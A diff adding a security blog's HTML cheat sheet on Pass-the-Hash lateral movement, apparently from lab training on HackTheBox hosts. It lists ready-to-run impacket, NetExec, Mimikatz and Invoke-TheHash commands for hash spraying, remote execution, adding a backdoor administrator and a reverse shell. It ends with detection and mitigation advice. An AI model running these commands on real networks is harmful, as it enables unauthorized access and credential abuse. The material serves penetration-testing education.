@@ -1,0 +1,368 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+    <title>
+      vipa0z</title>
+  <meta name="author" content="vipa0z">
+  
+  <meta name="description" content="Documenting the mechanics of system failure through red team tactics, CTF writeups, malware analysis, and the path into deeper systems hacking.">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+  <meta property="og:site_name" content="vipa0z"/>
+
+  
+    <meta property="og:image" content="favicon.png"/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="vipa0z" type="application/atom+xml">
+  
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/gitbook.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+  <meta name="title" content="vipa0z">
+  <!-- analytics -->
+  
+
+        <!--  favicon/indexing -->
+        <link rel="icon" type="image/png" href="/favicon.ico/favicon-96x96.png" sizes="96x96" />
+        <link rel="icon" type="image/svg+xml" href="/favicon.ico/favicon.svg" />
+        <link rel="shortcut icon" href="/favicon.ico/favicon.ico" />
+        <link rel="apple-touch-icon" sizes="180x180" href="/favicon.ico/apple-touch-icon.png" />
+        <link rel="manifest" href="/favicon.ico/site.webmanifest" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+	<div class="container">
+		<button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+			<span class="sr-only">Toggle navigation</span>
+			<span class="icon-bar"></span>
+			<span class="icon-bar"></span>
+			<span class="icon-bar"></span>
+		</button>
+		<a class="navbar-brand" href="/">
+			vipa0z
+		</a>
+		<div class="collapse navbar-collapse nav-menu">
+			<ul class="nav navbar-nav">
+				
+					<li>
+						<a href="/index" title="Home">
+							<i class="fa fa-home"></i>Home
+						</a>
+					</li>
+					
+					<li>
+						<a href="/archives" title="All the articles.">
+							<i class="fa fa-archive"></i>Archives
+						</a>
+					</li>
+					
+					<li>
+						<a href="/tags" title="All the tags.">
+							<i class="fa fa-tags"></i>Tags
+						</a>
+					</li>
+					
+					<li>
+						<a href="/cheatsheets/" title="Cheatsheets_and_Notes">
+							<i class="fa fa-book"></i>Docs
+						</a>
+					</li>
+					
+					<li>
+						<a href="/about" title="About me.">
+							<i class="fa fa-user"></i>About Me
+						</a>
+					</li>
+					
+						<!-- Theme Toggle -->
+						<li>
+							<a href="#" class="theme-toggle-btn" aria-label="Toggle theme">
+								<i class="fa fa-moon-o"></i> Theme
+							</a>
+						</li>
+			</ul>
+		</div>
+	</div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+  <div class="container">
+  	<div class="content">
+    	 
+	
+		<div class="page-header">
+			<h1> </h1>
+		</div>
+	
+
+
+
+<div class="row page">
+	<!-- cols -->
+	
+	<div class="col-md-12"> 
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="Pass-the-Hash-PTH"><a href="#Pass-the-Hash-PTH" class="headerlink" title="Pass the Hash (PTH)"></a>Pass the Hash (PTH)</h1><p>Authenticate to remote systems using NTLM password hashes without knowing the cleartext password.<br>This lateral movement technique is effective when you’ve obtained password hashes but cannot crack them.</p>
+<h2 id="Quick-Reference"><a href="#Quick-Reference" class="headerlink" title="Quick Reference"></a>Quick Reference</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Impacket psexec</span></span><br><span class="line">impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453</span><br><span class="line"></span><br><span class="line"><span class="comment"># NetExec PTH</span></span><br><span class="line">nxc smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453</span><br><span class="line"></span><br><span class="line"><span class="comment"># NetExec with command execution</span></span><br><span class="line">nxc smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x <span class="built_in">whoami</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Pass-the-Hash-from-Linux"><a href="#Pass-the-Hash-from-Linux" class="headerlink" title="Pass the Hash from Linux"></a>Pass the Hash from Linux</h2><h3 id="Impacket-psexec"><a href="#Impacket-psexec" class="headerlink" title="Impacket - psexec"></a>Impacket - psexec</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453</span><br></pre></td></tr></table></figure>
+
+<h3 id="Impacket-Other-Tools"><a href="#Impacket-Other-Tools" class="headerlink" title="Impacket - Other Tools"></a>Impacket - Other Tools</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># WMI execution</span></span><br><span class="line">impacket-wmiexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453</span><br><span class="line"></span><br><span class="line"><span class="comment"># AT command execution</span></span><br><span class="line">impacket-atexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453</span><br><span class="line"></span><br><span class="line"><span class="comment"># SMB execution</span></span><br><span class="line">impacket-smbexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453</span><br></pre></td></tr></table></figure>
+
+<h3 id="NetExec-Subnet-Spray"><a href="#NetExec-Subnet-Spray" class="headerlink" title="NetExec - Subnet Spray"></a>NetExec - Subnet Spray</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Spray hash across subnet</span></span><br><span class="line">nxc smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453</span><br><span class="line"></span><br><span class="line"><span class="comment"># Local authentication</span></span><br><span class="line">nxc smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 --local-auth</span><br></pre></td></tr></table></figure>
+
+<h3 id="NetExec-Command-Execution"><a href="#NetExec-Command-Execution" class="headerlink" title="NetExec - Command Execution"></a>NetExec - Command Execution</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x <span class="built_in">whoami</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="RDP-with-Pass-the-Hash"><a href="#RDP-with-Pass-the-Hash" class="headerlink" title="RDP with Pass the Hash"></a>RDP with Pass the Hash</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xfreerdp /v:10.129.201.126 /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453</span><br></pre></td></tr></table></figure>
+
+<p><strong>Requirements for RDP PTH</strong>:</p>
+<ul>
+<li>Restricted Admin Mode must be enabled on target</li>
+<li>Enable with registry key if needed (see Notes section)</li>
+</ul>
+<h2 id="Pass-the-Hash-from-Windows"><a href="#Pass-the-Hash-from-Windows" class="headerlink" title="Pass the Hash from Windows"></a>Pass the Hash from Windows</h2><h3 id="Mimikatz-PTH-to-Create-Shell"><a href="#Mimikatz-PTH-to-Create-Shell" class="headerlink" title="Mimikatz - PTH to Create Shell"></a>Mimikatz - PTH to Create Shell</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz.exe privilege::debug &quot;sekurlsa::pth /user:david /ntlm:c39f2beb3d2ec06a62cb887fb391dee0 /domain:inlanefreight.htb /run:<span class="built_in">cmd</span>.exe&quot; <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
+
+<p>This creates a new cmd.exe window in the context of the specified user.</p>
+<h3 id="Invoke-TheHash-Create-User"><a href="#Invoke-TheHash-Create-User" class="headerlink" title="Invoke-TheHash - Create User"></a>Invoke-TheHash - Create User</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> C:\tools\<span class="built_in">Invoke-TheHash</span>\</span><br><span class="line"><span class="built_in">Import-Module</span> .\<span class="built_in">Invoke-TheHash</span>.psd1</span><br><span class="line"><span class="built_in">Invoke-SMBExec</span> <span class="literal">-Target</span> <span class="number">172.16</span>.<span class="number">1.10</span> <span class="literal">-Domain</span> inlanefreight.htb <span class="literal">-Username</span> julio <span class="literal">-Hash</span> <span class="number">64</span>F12CDDAA88057E06A81B54E73B949B <span class="literal">-Command</span> <span class="string">&quot;net user mark Password123 /add &amp;&amp; net localgroup administrators mark /add&quot;</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Invoke-TheHash-Reverse-Shell"><a href="#Invoke-TheHash-Reverse-Shell" class="headerlink" title="Invoke-TheHash - Reverse Shell"></a>Invoke-TheHash - Reverse Shell</h3><p>Start listener:</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">.\nc.exe <span class="literal">-lvnp</span> <span class="number">8001</span></span><br></pre></td></tr></table></figure>
+
+<p>Execute reverse shell:</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\<span class="built_in">Invoke-TheHash</span>.psd1</span><br><span class="line"><span class="built_in">Invoke-WMIExec</span> <span class="literal">-Target</span> DC01 <span class="literal">-Domain</span> inlanefreight.htb <span class="literal">-Username</span> julio <span class="literal">-Hash</span> <span class="number">64</span>F12CDDAA88057E06A81B54E73B949B <span class="literal">-Command</span> <span class="string">&quot;powershell -e &lt;base64_encoded_shell&gt;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Common-Workflows"><a href="#Common-Workflows" class="headerlink" title="Common Workflows"></a>Common Workflows</h2><h3 id="Hash-Spray-Across-Network"><a href="#Hash-Spray-Across-Network" class="headerlink" title="Hash Spray Across Network"></a>Hash Spray Across Network</h3><ol>
+<li>Obtain NTLM hash from compromised system</li>
+<li>Use NetExec to spray hash across subnet</li>
+<li>Identify systems where hash is valid (look for “Pwn3d!”)</li>
+<li>Execute commands or gain shells on accessible systems</li>
+</ol>
+<h3 id="Lateral-Movement-with-Mimikatz"><a href="#Lateral-Movement-with-Mimikatz" class="headerlink" title="Lateral Movement with Mimikatz"></a>Lateral Movement with Mimikatz</h3><ol>
+<li>Dump hashes from compromised system</li>
+<li>Use Mimikatz sekurlsa::pth to create shell with hash</li>
+<li>Access remote shares or systems</li>
+<li>Dump additional credentials from new systems</li>
+</ol>
+<h3 id="Remote-Administration-with-Impacket"><a href="#Remote-Administration-with-Impacket" class="headerlink" title="Remote Administration with Impacket"></a>Remote Administration with Impacket</h3><ol>
+<li>Obtain administrator hash</li>
+<li>Use impacket-psexec or impacket-wmiexec for shell</li>
+<li>Execute commands or scripts remotely</li>
+<li>Pivot to additional systems</li>
+</ol>
+<h2 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h2><h3 id="How-Pass-the-Hash-Works"><a href="#How-Pass-the-Hash-Works" class="headerlink" title="How Pass the Hash Works"></a>How Pass the Hash Works</h3><p>Pass the Hash exploits NTLM authentication:</p>
+<ul>
+<li>NTLM uses password hash for authentication</li>
+<li>Hash can be used directly without cracking</li>
+<li>Works for SMB, WMI, RDP (with Restricted Admin), and other protocols</li>
+<li>Does not work for Kerberos authentication</li>
+</ul>
+<h3 id="UAC-and-Local-Account-Restrictions"><a href="#UAC-and-Local-Account-Restrictions" class="headerlink" title="UAC and Local Account Restrictions"></a>UAC and Local Account Restrictions</h3><p><strong>UAC Limits PTH for Local Accounts</strong>:</p>
+<p>Registry key <code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy</code>:</p>
+<ul>
+<li><strong>Value 0</strong> (default): Only built-in Administrator (RID-500) can perform remote admin</li>
+<li><strong>Value 1</strong>: All local administrators can perform remote admin</li>
+</ul>
+<p><strong>Exception</strong>: If <code>FilterAdministratorToken</code> is enabled (value 1), even RID-500 is restricted.</p>
+<p><strong>Important</strong>: Domain accounts with local admin rights are NOT affected by these restrictions.</p>
+<h3 id="Enabling-Restricted-Admin-Mode-for-RDP"><a href="#Enabling-Restricted-Admin-Mode-for-RDP" class="headerlink" title="Enabling Restricted Admin Mode for RDP"></a>Enabling Restricted Admin Mode for RDP</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d <span class="number">0</span>x0 /f</span><br></pre></td></tr></table></figure>
+
+<h3 id="Hash-Format"><a href="#Hash-Format" class="headerlink" title="Hash Format"></a>Hash Format</h3><p>NTLM hash format for tools:</p>
+<ul>
+<li>Full format: <code>LM:NTLM</code></li>
+<li>LM hash often empty: <code>:NTLM</code></li>
+<li>Example: <code>:30B3783CE2ABF1AF70F77D0660CF3453</code></li>
+</ul>
+<h3 id="NetExec-Output-Indicators"><a href="#NetExec-Output-Indicators" class="headerlink" title="NetExec Output Indicators"></a>NetExec Output Indicators</h3><ul>
+<li><strong>Pwn3d!</strong>: User is local administrator on target</li>
+<li><strong>[+]</strong>: Authentication successful</li>
+<li><strong>[-]</strong>: Authentication failed</li>
+</ul>
+<h3 id="Detection-and-Mitigation"><a href="#Detection-and-Mitigation" class="headerlink" title="Detection and Mitigation"></a>Detection and Mitigation</h3><p><strong>Detection</strong>:</p>
+<ul>
+<li>Monitor for NTLM authentication from unusual sources</li>
+<li>Alert on lateral movement patterns</li>
+<li>Track use of administrative shares (ADMIN$, C$)</li>
+<li>Monitor for Mimikatz indicators (privilege::debug, sekurlsa)</li>
+</ul>
+<p><strong>Mitigation</strong>:</p>
+<ul>
+<li>Implement LAPS (Local Administrator Password Solution)</li>
+<li>Disable NTLM authentication where possible</li>
+<li>Require Kerberos authentication</li>
+<li>Enable Protected Users group for sensitive accounts</li>
+<li>Implement Credential Guard</li>
+<li>Use tiered administrative model</li>
+<li>Monitor and restrict administrative share access</li>
+</ul>
+<h3 id="LAPS-Recommendation"><a href="#LAPS-Recommendation" class="headerlink" title="LAPS Recommendation"></a>LAPS Recommendation</h3><p>Local Administrator Password Solution (LAPS):</p>
+<ul>
+<li>Randomizes local administrator passwords</li>
+<li>Rotates passwords on fixed interval</li>
+<li>Stores passwords in Active Directory</li>
+<li>Prevents password reuse across systems</li>
+<li>Essential mitigation for PTH attacks</li>
+</ul>
+<h3 id="Tools-Comparison"><a href="#Tools-Comparison" class="headerlink" title="Tools Comparison"></a>Tools Comparison</h3><table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>Protocol</th>
+<th>Shell Type</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>impacket-psexec</td>
+<td>SMB</td>
+<td>Interactive</td>
+<td>Uses RemComSvc</td>
+</tr>
+<tr>
+<td>impacket-wmiexec</td>
+<td>WMI</td>
+<td>Semi-interactive</td>
+<td>Stealthier than psexec</td>
+</tr>
+<tr>
+<td>impacket-smbexec</td>
+<td>SMB</td>
+<td>Interactive</td>
+<td>Uses native Windows commands</td>
+</tr>
+<tr>
+<td>impacket-atexec</td>
+<td>Task Scheduler</td>
+<td>Non-interactive</td>
+<td>Single command execution</td>
+</tr>
+<tr>
+<td>NetExec</td>
+<td>SMB&#x2F;WMI</td>
+<td>Command execution</td>
+<td>Best for spraying</td>
+</tr>
+<tr>
+<td>Mimikatz</td>
+<td>Various</td>
+<td>New process</td>
+<td>Creates shell in user context</td>
+</tr>
+</tbody></table>
+<h3 id="Related-Techniques"><a href="#Related-Techniques" class="headerlink" title="Related Techniques"></a>Related Techniques</h3><ul>
+<li>Pass the Ticket (PTT) for Kerberos environments</li>
+<li>Overpass the Hash (Pass the Key)</li>
+<li>Pass the Certificate</li>
+<li>Token impersonation</li>
+</ul>
+
+	  <div class="article-footer-copyright">
+
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2025 vipa0z's Blog
+  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+  <script src="/js/theme-toggle.js"></script>
+</body>
+   </html>
